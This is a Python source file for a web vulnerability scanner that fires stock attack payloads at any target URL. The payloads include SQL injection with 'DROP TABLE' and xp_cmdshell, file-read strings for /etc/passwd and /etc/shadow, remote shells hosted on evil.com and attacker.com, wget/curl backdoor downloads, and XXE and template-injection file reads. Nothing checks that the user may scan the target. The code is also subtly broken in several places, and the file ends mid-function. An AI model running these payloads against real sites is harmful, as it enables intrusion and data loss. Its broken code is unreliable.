#!/usr/bin/env python3
"""
SecureScan Pro - Advanced Web Vulnerability Scanner
A comprehensive command-line vulnerability scanner with email alerts
"""

import requests
import argparse
import json
import time
import smtplib
import urllib.parse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from urllib.parse import urljoin, urlparse
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import socket

# ANSI Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.stats = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        
        # Comprehensive vulnerability payloads
        self.payloads = {
            'sqli': [
                "' OR '1'='1' --",
                "' UNION SELECT null, version(), null --",
                "'; DROP TABLE users; --",
                "' OR 1=1 /*",
                "admin'--",
                "' OR 'x'='x",
                "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
                "' UNION ALL SELECT @@version --",
                "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' OR SLEEP(5)--",
                "1' WAITFOR DELAY '00:00:05'--",
                "'; EXEC xp_cmdshell('dir')--",
                "' OR 1=1#",
                "' HAVING 1=1--",
                "' GROUP BY 1,2,3,4,5--",
                "1' ORDER BY 100--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<select onfocus=alert('XSS') autofocus>",
                "'\"><script>alert('XSS')</script>",
                "</script><script>alert('XSS')</script>",
                "<svg/onload=alert('XSS')>",
                "<img src=1 onerror=alert('XSS')>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/proc/self/environ",
                "../../../var/log/apache2/access.log",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=../config.php",
                "file:///etc/passwd",
                "../../../../../../etc/shadow",
                "../../../proc/version",
                "..\\..\\..\\boot.ini",
                "C:\\windows\\system32\\config\\sam",
                "/var/log/httpd/access_log",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4="
            ],
            'rfi': [
                "http://evil.com/shell.txt",
                "ftp://attacker.com/backdoor.php",
                "https://malicious-site.com/webshell.txt",
                "http://127.0.0.1/malicious.php",
                "https://pastebin.com/raw/malicious",
                "http://bit.ly/malicious-payload",
                "data://text/plain,<?php system($_GET['cmd']); ?>",
                "php://input",
                "expect://id",
                "http://attacker.com/shell.php%00"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><test></test>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
                '<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd"> %ext;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>'
            ],
            'csrf': [
                '<form action="http://target.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form>',
                '<img src="http://target.com/delete?id=1">',
                '<iframe src="http://target.com/admin/delete"></iframe>',
                '<script>fetch("/api/delete", {method: "POST"})</script>',
                '<form action="/change-password" method="post"><input name="password" value="hacked123"></form>'
            ],
            'open_redirect': [
                "http://target.com/redirect?url=http://evil.com",
                "//evil.com",
                "https://evil.com",
                "javascript:alert('redirect')",
                "data:text/html,<script>alert('redirect')</script>",
                "/\\evil.com",
                "http://target.com@evil.com",
                "http://evil.com%2etarget.com",
                "//google.com",
                "///evil.com",
                "http:evil.com"
            ],
            'cmd_injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; ping -c 4 127.0.0.1",
                "| netstat -an",
                "; uname -a",
                "&& dir",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts",
                "; cat /proc/version",
                "$(ping -c 1 127.0.0.1)",
                "`cat /etc/hosts`",
                "; wget http://attacker.com/backdoor",
                "| curl http://evil.com/shell.sh"
            ],
            'directory_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/shadow",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "../../../../../../var/log/apache2/access.log",
                "../../../proc/self/environ",
                "..\\..\\..\\boot.ini",
                "/../../../../etc/passwd",
                "\\..\\..\\..\\etc\\passwd",
                "%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32\\config\\sam"
            ],
            'ldap_injection': [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*)(cn=*))(|(cn=*",
                "*)(&(objectClass=*))",
                "*))%00",
                "admin)(|(password=*))",
                "*)(userPassword=*))(|(userPassword=*",
                "*)((userPassword=*))(|(userPassword=*"
            ]
        }
        
        self.descriptions = {
            'sqli': "SQL Injection vulnerability allows attackers to execute malicious SQL queries",
            'xss': "Cross-Site Scripting allows injection of malicious scripts into web pages",
            'lfi': "Local File Inclusion allows reading local files from the server",
            'rfi': "Remote File Inclusion allows inclusion of remote files in the application",
            'xxe': "XML External Entity attack can lead to data disclosure and SSRF",
            'csrf': "Cross-Site Request Forgery allows unauthorized actions on behalf of users",
            'open_redirect': "Open Redirect vulnerability can be used for phishing attacks",
            'cmd_injection': "Command Injection allows execution of arbitrary system commands",
            'directory_traversal': "Directory Traversal allows access to files outside intended directories",
            'ldap_injection': "LDAP Injection can lead to unauthorized access and information disclosure"
        }

    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                    🛡️  SecureScan Pro v2.0                    ║
║              Advanced Web Vulnerability Scanner               ║
║                     Command Line Edition                      ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)

    def validate_url(self, url):
        """Validate and normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def test_connection(self, url):
        """Test if the target is reachable"""
        try:
            response = self.session.get(url, timeout=10)
            return True, response.status_code
        except requests.exceptions.RequestException as e:
            return False, str(e)

    def scan_sql_injection(self, url, endpoints):
        """Scan for SQL Injection vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing SQL Injection...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['sqli']:
                try:
                    # Test GET parameter
                    test_url = f"{target_url}?id={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for SQL error indicators
                    error_indicators = [
                        'mysql_fetch_array()', 'ORA-01756', 'Microsoft OLE DB',
                        'SQLServer JDBC Driver', 'postgresql', 'sqlite_master',
                        'SQL syntax', 'mysql_num_rows()', 'Warning: pg_exec()',
                        'valid MySQL result', 'MySqlClient.', 'PostgreSQL query failed'
                    ]
                    
                    if any(indicator.lower() in response.text.lower() for indicator in error_indicators):
                        severity = self.determine_severity('sqli', payload)
                        self.add_vulnerability('sqli', severity, test_url, payload, 
                                             "SQL error messages detected in response")
                        break
                        
                    # Test POST data
                    post_data = {'username': payload, 'password': 'test'}
                    response = self.session.post(target_url, data=post_data, timeout=5)
                    
                    if any(indicator.lower() in response.text.lower() for indicator in error_indicators):
                        severity = self.determine_severity('sqli', payload)
                        self.add_vulnerability('sqli', severity, target_url, str(post_data), 
                                             "SQL error messages detected in POST response")
                        break
                        
                except requests.exceptions.RequestException:
                    continue

    def scan_xss(self, url, endpoints):
        """Scan for Cross-Site Scripting vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Cross-Site Scripting...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['xss']:
                try:
                    # Test GET parameter
                    test_url = f"{target_url}?search={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check if payload is reflected without encoding
                    if payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text:
                        severity = self.determine_severity('xss', payload)
                        self.add_vulnerability('xss', severity, test_url, payload,
                                             "Potential XSS reflection detected")
                    
                    # Test POST data
                    post_data = {'comment': payload, 'name': 'test'}
                    response = self.session.post(target_url, data=post_data, timeout=5)
                    
                    if payload in response.text:
                        severity = self.determine_severity('xss', payload)
                        self.add_vulnerability('xss', severity, target_url, str(post_data),
                                             "Potential stored XSS detected")
                        
                except requests.exceptions.RequestException:
                    continue

    def scan_lfi(self, url, endpoints):
        """Scan for Local File Inclusion vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Local File Inclusion...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['lfi']:
                try:
                    test_url = f"{target_url}?file={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for file inclusion indicators
                    lfi_indicators = [
                        'root:x:0:0:', '/bin/bash', '/bin/sh', '[boot loader]',
                        'Windows Registry Editor', '#<Pubkey>', 'daemon:x:1:1:'
                    ]
                    
                    if any(indicator in response.text for indicator in lfi_indicators):
                        severity = self.determine_severity('lfi', payload)
                        self.add_vulnerability('lfi', severity, test_url, payload,
                                             "Local file inclusion detected")
                        
                except requests.exceptions.RequestException:
                    continue

    def scan_rfi(self, url, endpoints):
        """Scan for Remote File Inclusion vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Remote File Inclusion...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['rfi']:
                try:
                    test_url = f"{target_url}?include={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for RFI indicators (this is a basic check)
                    if response.status_code == 200 and len(response.text) > 100:
                        severity = self.determine_severity('rfi', payload)
                        self.add_vulnerability('rfi', 'medium', test_url, payload,
                                             "Potential remote file inclusion")
                        
                except requests.exceptions.RequestException:
                    continue

    def scan_xxe(self, url, endpoints):
        """Scan for XML External Entity vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing XML External Entity...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['xxe']:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(target_url, data=payload, headers=headers, timeout=5)
                    
                    # Check for XXE indicators
                    xxe_indicators = ['root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:']
                    
                    if any(indicator in response.text for indicator in xxe_indicators):
                        severity = self.determine_severity('xxe', payload)
                        self.add_vulnerability('xxe', severity, target_url, payload,
                                             "XXE vulnerability detected")
                        
                except requests.exceptions.RequestException:
                    continue

    def scan_open_redirect(self, url, endpoints):
        """Scan for Open Redirect vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Open Redirect...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['open_redirect']:
                try:
                    test_url = f"{target_url}?redirect={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5, allow_redirects=False)
                    
                    # Check for redirect responses
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            severity = self.determine_severity('open_redirect', payload)
                            self.add_vulnerability('open_redirect', severity, test_url, payload,
                                                 f"Open redirect to: {location}")
                        
                except requests.exceptions.RequestException:
                    continue

    def scan_cmd_injection(self, url, endpoints):
        """Scan for Command Injection vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Command Injection...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['cmd_injection']:
                try:
                    test_url = f"{target_url}?cmd={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'groups=', 'Windows IP Configuration',
                        'Volume Serial Number', 'Directory of', 'total ', 'drwx'
                    ]
                    
                    if any(indicator in response.text for indicator in cmd_indicators):
                        severity = self.determine_severity('cmd_injection', payload)
                        self.add_vulnerability('cmd_injection', severity, test_url, payload,
                                             "Command injection detected")
                        
                except requests.exceptions.RequestException:
                    continue

    def determine_severity(self, vuln_type, payload):
        """Determine vulnerability severity based on type and payload"""
        critical_patterns = ['DROP TABLE', 'UNION SELECT', 'xp_cmdshell', 'system(']
        high_patterns = ['etc/passwd', 'boot.ini', 'javascript:', '<script>']
        
        payload_lower = payload.lower()
        
        if any(pattern.lower() in payload_lower for pattern in critical_patterns):
            return 'critical'
        elif any(pattern.lower() in payload_lower for pattern in high_patterns):
            return 'high'
        elif vuln_type in ['sqli', 'xss', 'cmd_injection', 'xxe']:
            return 'high'
        elif vuln_type in ['lfi', 'rfi', 'open_redirect']:
            return 'medium'
        else:
            return 'low'

    def add_vulnerability(self, vuln_type, severity, url, payload, description):
        """Add vulnerability to results"""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'url': url,
            'payload': payload,
            'description': description,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.vulnerabilities.append(vulnerability)
        self.stats[severity] += 1
        
        # Real-time output
        severity_colors = {
            'critical': Colors.RED,
            'high': Colors.MAGENTA,
            'medium': Colors.YELLOW,
            'low': Colors.CYAN,
            'info': Colors.BLUE
        }
        
        color = severity_colors.get(severity, Colors.WHITE)
        print(f"{color}[+] {severity.upper()}: {vuln_type.upper()} - {description}{Colors.END}")
        print(f"    URL: {url}")
        print(f"    Payload: {payload[:100]}...")
        print()

    def generate_endpoints(self, url):
        """Generate common endpoints to test"""
        common_endpoints = [
            '/',
            '/login',
            '/admin',
            '/search',
            '/profile',
            '/user',
            '/contact',
            '/comment',
            '/upload',
            '/file',
            '/page',
            '/redirect',
            '/api/user',
            '/api/search',
            '/admin/login',
            '/user/profile',
            '/includes/file.php',
            '/scripts/search.php',
            '/cgi-bin/test.cgi'
        ]
        return common_endpoints

    def run_scan(self, target_url, vuln_types, email_config=None):
        """Main scanning function"""
        if not self.validate_url(target_url):
            print(f"{Colors.RED}[!] Invalid URL format{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}[*] Target: {target_url}{Colors.END}")
        print(f"{Colors.GREEN}[*] Testing connection...{Colors.END}")
        
        connected, status = self.test_connection(target_url)
        if not connected:
            print(f"{Colors.RED}[!] Cannot connect to target: {status}{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}[*] Connection successful (Status: {status}){Colors.END}")
        print(f"{Colors.GREEN}[*] Starting vulnerability scan...{Colors.END}")
        print()
        
        endpoints = self.generate_endpoints(target_url)
        
        # Run selected vulnerability tests
        scan_methods = {
            'sqli': self.scan_sql_injection,
            'xss': self.scan_xss,
            'lfi': self.scan_lfi,
            'rfi': self.scan_rfi,
            'xxe': self.scan_xxe,
            'open_redirect': self.scan_open_redirect,
            'cmd_injection': self.scan_cmd_injection,
        }
        
        for vuln_type in vuln_types:
            if vuln_type in scan_methods:
                scan_methods[vuln_type](target_url, endpoints)
        
        # Generate report
        self.generate_report(target_url)
        
        # Send email if configured
        if email_config and self.vulnerabilities:
            self.send_email_alert(email_config, target_url)
        
        return True

    def generate_report(self, target_url):
        """Generate vulnerability report"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                           SCAN REPORT                          {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
        
        print(f"\n{Colors.BOLD}Target URL:{Colors.END} {target_url}")
        print(f"{Colors.BOLD}Scan Date:{Colors.END} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.BOLD}Total Vulnerabilities:{Colors.END} {len(self.vulnerabilities)}")
        
        # Statistics
        print(f"\n{Colors.BOLD}SEVERITY BREAKDOWN:{Colors.END}")
        print(f"  {Colors.RED}Critical: {self.stats['critical']}{Colors.END}")
        print(f"  {Colors.MAGENTA}High:     {self.stats['high']}{Colors.END}")
        print(f"  {Colors.YELLOW}Medium:   {self.stats['medium']}{Colors.END}")
        print(f"  {Colors.CYAN}Low:      {self.stats['low']}{Colors.END}")
        print(f"  {Colors.BLUE}Info:     {self.stats['info']}{Colors.END}")
        
        if not self.vulnerabilities:
            print(f"\n{Colors.GREEN}[✓] No vulnerabilities detected!{Colors.END}")
            print(f"{Colors.GREEN}    The target appears to be secure against tested attack vectors.{Colors.END}")
        else:
            print(f"\n{Colors.BOLD}DETAILED FINDINGS:{Colors.END}")
            print("─" * 80)
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                severity_colors = {
                    'critical': Colors.RED,
                    'high': Colors.MAGENTA,
                    'medium': Colors.YELLOW,
                    'low': Colors.CYAN,
                    'info': Colors.BLUE
                }
                
                color = severity_colors.get(vuln['severity'], Colors.WHITE)
                
                print(f"\n{Colors.BOLD}#{i} {vuln['type'].upper()}{Colors.END}")
                print(f"Severity: {color}{vuln['severity'].upper()}{Colors.END}")
                print(f"URL: {vuln['url']}")
                print(f"Description: {vuln['description']}")
                print(f"Payload: {vuln['payload']}")
                print(f"Detected: {vuln['timestamp']}")
                
        print(f"\n{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")

    def send_email_alert(self, email_config, target_url):
        """Send email alert with scan results"""
        try:
            print(f"\n{Colors.BLUE}[*] Sending email alert...{Colors.END}")
            
            # Create message
            msg = MIMEMultipart()
            msg['From'] = email_config['from_email']
            msg['To'] = email_config['to_email']
            msg['Subject'] = f"🚨 Security Scan Alert - {urlparse(target_url).netloc}"
            
            # Create email body
            body = f"""
Security Scan Report
═══════════════════════════════════════

Target: {target_url}
Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Vulnerabilities: {len(self.vulnerabilities)}

Severity Breakdown:
• Critical: {self.stats['critical']}
• High: {self.stats['high']}
• Medium: {self.stats['medium']}
• Low: {self.stats['low']}
• Info: {self.stats['info']}

Detailed Findings:
───────────────────

"""
            
            for i, vuln in enumerate(self.vulnerabilities[:10], 1):  # Limit to top 10
                body += f"""
{i}. {vuln['type'].upper()} - {vuln['severity'].upper()}
   URL: {vuln['url']}
   Description: {vuln['description']}
   Payload: {vuln['payload'][:100]}...
   Detected: {vuln['timestamp']}

"""
            
            if len(self.vulnerabilities) > 10:
                body += f"\n... and {len(self.vulnerabilities) - 10} more vulnerabilities.\n"
            
            body += """
═══════════════════════════════════════

This is an automated security scan report.
Please review and remediate the identified vulnerabilities.

SecureScan Pro - Web Vulnerability Scanner
"""
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server = smtplib.SMTP(email_config['smtp_server'], email_config['smtp_port'])
            server.starttls()
            server.login(email_config['from_email'], email_config['password'])
            server.send_message(msg)
            server.quit()
            
            print(f"{Colors.GREEN}[✓] Email alert sent successfully to {email_config['to_email']}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to send email: {str(e)}{Colors.END}")

def main():
    parser = argparse.ArgumentParser(
        description="SecureScan Pro - Advanced Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 scanner.py -u https://example.com
  python3 scanner.py -u https://example.com -t sqli xss lfi
  python3 scanner.py -u https://example.com --email alerts@company.com
  python3 scanner.py -u https://example.com -t all --email alerts@company.com
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-t', '--types', nargs='+', 
                       choices=['sqli', 'xss', 'lfi', 'rfi', 'xxe', 'open_redirect', 
                               'cmd_injection', 'all'],
                       default=['all'], help='Vulnerability types to test')
    parser.add_argument('--email', help='Email address for alerts')
    parser.add_argument('--smtp-server', default='smtp.gmail.com', help='SMTP server (default: smtp.gmail.com)')
    parser.add_argument('--smtp-port', type=int, default=587, help='SMTP port (default: 587)')
    parser.add_argument('--from-email', help='Sender email address')
    parser.add_argument('--email-password', help='Email password or app password')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('--output', '-o', help='Output file for results (JSON format)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Initialize scanner
    scanner = VulnerabilityScanner()
    scanner.print_banner()
    
    # Determine vulnerability types to test
    if 'all' in args.types:
        vuln_types = ['sqli', 'xss', 'lfi', 'rfi', 'xxe', 'open_redirect', 'cmd_injection']
    else:
        vuln_types = args.types
    
    print(f"{Colors.GREEN}[*] Vulnerability types: {', '.join(vuln_types)}{Colors.END}")
    
    # Configure email if provided
    email_config = None
    if args.email:
        if not args.from_email or not args.email_password:
            print(f"{Colors.YELLOW}[!] Email alerts enabled but missing sender credentials{Colors.END}")
            print(f"{Colors.YELLOW}    Use --from-email and --email-password for email functionality{Colors.END}")
        else:
            email_config = {
                'to_email': args.email,
                'from_email': args.from_email,
                'password': args.email_password,
                'smtp_server': args.smtp_server,
                'smtp_port': args.smtp_port
            }
            print(f"{Colors.GREEN}[*] Email alerts configured: {args.email}{Colors.END}")
    
    # Run the scan
    start_time = time.time()
    success = scanner.run_scan(args.url, vuln_types, email_config)
    end_time = time.time()
    
    if success:
        print(f"\n{Colors.GREEN}[✓] Scan completed in {end_time - start_time:.2f} seconds{Colors.END}")
        
        # Save results to file if specified
        if args.output:
            scanner.save_results_to_file(args.output)
            print(f"{Colors.GREEN}[✓] Results saved to {args.output}{Colors.END}")
    else:
        print(f"{Colors.RED}[!] Scan failed{Colors.END}")
        sys.exit(1)

class AdvancedVulnerabilityScanner(VulnerabilityScanner):
    """Extended scanner with additional features"""
    
    def __init__(self):
        super().__init__()
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def scan_directory_traversal(self, url, endpoints):
        """Advanced directory traversal scanning"""
        print(f"{Colors.BLUE}[*] Testing Directory Traversal...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['directory_traversal']:
                try:
                    # Test various parameters
                    params_to_test = ['file', 'page', 'include', 'path', 'dir', 'document']
                    
                    for param in params_to_test:
                        test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check for directory traversal indicators
                        traversal_indicators = [
                            'root:x:0:0:', '[boot loader]', 'Windows Registry Editor',
                            'daemon:x:1:1:', 'bin:x:2:2:', 'sys:x:3:3:'
                        ]
                        
                        if any(indicator in response.text for indicator in traversal_indicators):
                            severity = self.determine_severity('directory_traversal', payload)
                            self.add_vulnerability('directory_traversal', severity, test_url, payload,
                                                 "Directory traversal vulnerability detected")
                            
                except requests.exceptions.RequestException:
                    continue
    
    def scan_ldap_injection(self, url, endpoints):
        """LDAP Injection scanning"""
        print(f"{Colors.BLUE}[*] Testing LDAP Injection...{Colors.END}")
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in self.payloads['ldap_injection']:
                try:
                    # Test LDAP injection in login forms
                    post_data = {'username': payload, 'password': 'test'}
                    response = self.session.post(target_url, data=post_data, timeout=5)
                    
                    # Check for LDAP error messages
                    ldap_errors = [
                        'Invalid DN syntax', 'LDAP: error code', 'javax.naming.directory',
                        'LdapErr', 'LDAP operation failed', '80090308'
                    ]
                    
                    if any(error in response.text for error in ldap_errors):
                        severity = self.determine_severity('ldap_injection', payload)
                        self.add_vulnerability('ldap_injection', severity, target_url, str(post_data),
                                             "LDAP injection vulnerability detected")
                        
                    # Also test GET parameters
                    test_url = f"{target_url}?search={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if any(error in response.text for error in ldap_errors):
                        severity = self.determine_severity('ldap_injection', payload)
                        self.add_vulnerability('ldap_injection', severity, test_url, payload,
                                             "LDAP injection in search parameter")
                        
                except requests.exceptions.RequestException:
                    continue
    
    def scan_server_side_template_injection(self, url, endpoints):
        """Server-Side Template Injection scanning"""
        print(f"{Colors.BLUE}[*] Testing Server-Side Template Injection...{Colors.END}")
        
        ssti_payloads = [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>",
            "{{config}}", "${@print(42)}", "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${{<%[%'"}}%\.", "{{request}}", "${product.getClass()}"
        ]
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in ssti_payloads:
                try:
                    # Test in various parameters
                    params = ['name', 'template', 'content', 'message', 'data']
                    
                    for param in params:
                        test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check for template evaluation
                        if '49' in response.text and payload == "{{7*7}}":
                            self.add_vulnerability('ssti', 'high', test_url, payload,
                                                 "Server-Side Template Injection detected")
                        elif 'config' in response.text.lower() and '{{config}}' in payload:
                            self.add_vulnerability('ssti', 'high', test_url, payload,
                                                 "Template configuration disclosure")
                        
                        # Test POST requests
                        post_data = {param: payload}
                        response = self.session.post(target_url, data=post_data, timeout=5)
                        
                        if '49' in response.text and payload == "{{7*7}}":
                            self.add_vulnerability('ssti', 'high', target_url, str(post_data),
                                                 "Server-Side Template Injection in POST")
                        
                except requests.exceptions.RequestException:
                    continue
    
    def scan_nosql_injection(self, url, endpoints):
        """NoSQL Injection scanning"""
        print(f"{Colors.BLUE}[*] Testing NoSQL Injection...{Colors.END}")
        
        nosql_payloads = [
            "true, true", "', '", "1, 1", "[$ne]=1", "[$gt]=''", "[$exists]=true",
            "'; return true; var dummy='", "admin'||'1==1", "1'; return true; var dummy='1",
            "[$where]=function(){return true}", "[$regex]=.*"
        ]
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in nosql_payloads:
                try:
                    # Test login bypass
                    post_data = {'username': payload, 'password': payload}
                    response = self.session.post(target_url, data=post_data, timeout=5)
                    
                    # Check for successful login indicators
                    login_success = [
                        'welcome', 'dashboard', 'profile', 'logout', 'admin panel'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in login_success):
                        if response.status_code == 200:
                            self.add_vulnerability('nosql_injection', 'high', target_url, str(post_data),
                                                 "NoSQL injection authentication bypass")
                    
                    # Test GET parameters
                    test_url = f"{target_url}?id={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for NoSQL error messages
                    nosql_errors = [
                        'MongoError', 'CouchDB', 'SyntaxError: Unexpected token',
                        'ReferenceError:', 'MongoDB', 'CassandraError'
                    ]
                    
                    if any(error in response.text for error in nosql_errors):
                        self.add_vulnerability('nosql_injection', 'medium', test_url, payload,
                                             "NoSQL error message disclosure")
                        
                except requests.exceptions.RequestException:
                    continue
    
    def scan_crlf_injection(self, url, endpoints):
        """CRLF Injection scanning"""
        print(f"{Colors.BLUE}[*] Testing CRLF Injection...{Colors.END}")
        
        crlf_payloads = [
            "%0d%0aSet-Cookie:mycookie=myvalue",
            "\r\nSet-Cookie: test=crlf",
            "%0aSet-Cookie:admin=true",
            "%0d%0aLocation: http://evil.com",
            "\n\rX-Injected: true"
        ]
        
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            
            for payload in crlf_payloads:
                try:
                    test_url = f"{target_url}?redirect={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check response headers for injection
                    headers_str = str(response.headers).lower()
                    if 'mycookie' in headers_str or 'test=crlf' in headers_str or 'x-injected' in headers_str:
                        self.add_vulnerability('crlf_injection', 'medium', test_url, payload,
                                             "CRLF injection in HTTP headers")
                        
                except requests.exceptions.RequestException:
                    continue
    
    def save_results_to_file(self, filename):
        """Save scan results to JSON file"""
        try:
            results = {
                'scan_info': {
                    'timestamp': datetime.now().isoformat(),
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'statistics': self.stats
                },
                'vulnerabilities': self.vulnerabilities
            }
            
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
                
        except Exception as e:
